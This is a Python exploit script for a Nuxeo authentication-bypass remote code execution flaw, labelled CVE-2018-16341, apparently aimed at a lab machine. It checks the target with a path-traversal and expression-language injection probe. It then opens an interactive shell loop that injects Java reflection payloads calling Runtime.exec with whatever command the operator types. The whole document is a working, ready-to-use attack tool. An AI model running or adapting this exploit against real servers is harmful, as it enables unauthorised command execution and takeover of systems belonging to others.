from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
import requests
import base64
import json
import sys
import re

# Title and context of the script
print("\nNuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341\n")

# Proxy configuration (if required for testing/debugging; leave empty if not used)
proxy = {}

# Remote target URL
remote = "http://10.10.11.115"  # Update this to the actual target

# Architecture setting (can be either "WIN" or "UNIX")
ARCH = "WIN"

# Disable SSL warnings (for insecure requests over HTTP/HTTPS)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to check if the request was successful
def checkSuccess(r):
    """
    Checks the HTTP response for success criteria. If the response status code is not 200
    or the expected pattern is missing in the response, it exits the script.
    """
    if r.status_code == 200:
        # Search for the specific pattern indicating success
        m = re.search('login.jsp/pwn(.+?).xhtml', r.text)
        if m:
            # Ensure the response value matches expected criteria (e.g., pwn0.xhtml)
            if int(m.group(1)) == 0:
                print("OK")
                return
        print("\n[-] Error: Unexpected response")
        sys.exit()
    else:
        print("[-] Error: HTTP status code", r.status_code)
        sys.exit()

# Step 1: Check if the server is vulnerable
print("[+] Checking template injection vulnerability =>", end=' ')
request1 = remote + "/maintenance/..;/login.jsp/pwn${-7+7}.xhtml"  # Payload to test the vulnerability
r = requests.get(request1, proxies=proxy, verify=False, allow_redirects=False)
checkSuccess(r)  # Validate the server's response

print("")

# Main loop to execute commands on the vulnerable server
while True:
    try:
        # Step 2: Accept user input for commands
        command = input(f"command (\033[94m{ARCH}\033[0m)> ")  # Highlight the architecture in blue
        print('')

        # Step 3: Send the payload to execute the command
        print("[+] Executing command =>\n")
        request1 = remote + (
            '/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.io.BufferedReader")'
            '.getDeclaredMethod("readLine").invoke("".getClass().forName("java.io.BufferedReader")'
            '.getConstructor("".getClass().forName("java.io.Reader")).newInstance("".getClass()'
            '.forName("java.io.InputStreamReader").getConstructor("".getClass().forName("java.io.InputStream"))'
            '.newInstance("".getClass().forName("java.lang.Process").getDeclaredMethod("getInputStream").invoke('
            '"".getClass().forName("java.lang.Runtime").getDeclaredMethod("exec","".getClass()).invoke('
            '"".getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null),'
            f"'{command}')))))))}.xhtml"
        )

        # Step 4: Execute the request and process the result
        r = requests.get(request1, proxies=proxy, verify=False, allow_redirects=False)
        if r.status_code == 200:
            m = re.search('login.jsp/pwn(.+?).xhtml', r.text)
            if m:
                print(m.group(1))  # Print the result (or decoded payload if needed)
                print('')
        else:
            print("KO")
            sys.exit()

    except KeyboardInterrupt:
        # Handle user interruption (Ctrl+C)
        print("Exiting...")
        break
